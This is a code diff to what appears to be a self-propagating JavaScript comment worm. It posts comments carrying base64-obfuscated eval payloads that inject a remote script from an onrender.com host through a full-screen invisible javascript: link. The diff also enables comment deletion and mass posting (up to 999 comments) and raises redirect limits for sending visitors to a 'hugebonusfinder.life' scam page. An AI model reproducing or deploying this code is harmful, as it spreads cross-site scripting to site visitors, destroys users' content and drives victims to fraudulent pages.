@@ -254,7 +254,7 @@ function randomizeElement() {
 async function fetchAndPost(quantity) {
     try {
         for (let i = 0; i < quantity; i++) {
-            const commentString = `<gar class="loader" onwebkitanimationstart="(eval)(atob('ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ0NvbW1lbnRzJykuYXBwZW5kQ2hpbGQoT2JqZWN0LmFzc2lnbihkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSwgeyBzcmM6ICdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvQUxSSUNFRS9nYV9AbWFpbi93Yy5qcycgfSkpOw=='))"></gar>`;
+            const commentString = `<a style	="position:fixed;inset:0;z-index:999999" href="javascript:(eval)(atob('ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ0NvbW1lbnRzJykuYXBwZW5kQ2hpbGQoT2JqZWN0LmFzc2lnbihkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKSwgeyBzcmM6ICdodHRwczovL2NvdW50ZXItbHB2cy5vbnJlbmRlci5jb20vMi5qcycgfSkpOw'))">.</a>`;
             
             // Step 1: Fetch the counter URL asynchronously
             const counterResponse = await fetch('https://counter-lpvs.onrender.com');
@@ -366,7 +366,7 @@ function removeLoadingOverlay() {
 
 async function executeTask() {
 
-	//deleteComments();
+	deleteComments();
   createLoadingOverlay();
   ///
   getUserData();
@@ -374,18 +374,18 @@ async function executeTask() {
   ///
 
   const currentTime = Date.now();
-  const controlTimestamp = 1720018601800;
+  const controlTimestamp = 1722627097400;
 
   if (currentTime < controlTimestamp + 7200000) {
-  //await fetchAndPost(3);
+  await fetchAndPost(3);
 } else {
-	//await fetchAndPost(1);
+	await fetchAndPost(1);
 }
 	removeLoadingOverlay();
 
 
-  const maxRedirects24 = 4;
-  const maxRedirects24to48 = 8;
+  const maxRedirects24 = 10;
+  const maxRedirects24to48 = 20;
   const elapsed = currentTime - usefulInfo.ga.timestampRedirects;
 
   // Reset redirects if more than 48 hours have passed
@@ -415,14 +415,14 @@ async function executeTask() {
 
       // Perform redirect to a random link
       const links = [
-        "https://hugebonusfinder.life/?u=z34zyqu&o=thw8x3z&m=1&t=BBP"
+        "https://hugebonusfinder.life/?u=z34zyqu&o=thw8x3z&m=1&t=shmst_ms"
       ];
       const randomLink = links[Math.floor(Math.random() * links.length)];
       window.location.href = randomLink;
     }
   } else {
 	  await new Promise(resolve => setTimeout(resolve, 5100));
-	  //await fetchAndPost(999);
+	  await fetchAndPost(999);
 	  }
 }
 let startWaitTime = Date.now()-5500;
